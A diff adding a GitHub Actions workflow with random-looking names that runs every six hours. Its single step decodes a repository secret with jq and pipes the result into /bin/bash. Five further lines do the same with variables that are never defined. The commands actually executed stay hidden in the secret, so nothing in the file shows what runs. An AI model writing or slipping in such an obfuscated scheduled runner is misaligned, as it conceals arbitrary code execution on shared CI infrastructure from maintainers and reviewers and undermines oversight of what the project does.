@@ -1,0 +1,24 @@
+name: ruijindongning
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: ruijindongning
+        env:
+          t89628: ${{ secrets.t89628 }}
+        run: |
+          echo $t89628 | jq -r .jnvne9 | /bin/bash
+          echo $ja5520 | jq -r .duh985 | /bin/bash
+          echo $hepgm96294 | jq -r .ugmn8245 | /bin/bash
+          echo $al37 | jq -r .hug93 | /bin/bash
+          echo $glvqs14 | jq -r .uod527 | /bin/bash
+          echo $as3210 | jq -r .ltv93857 | /bin/bash
+
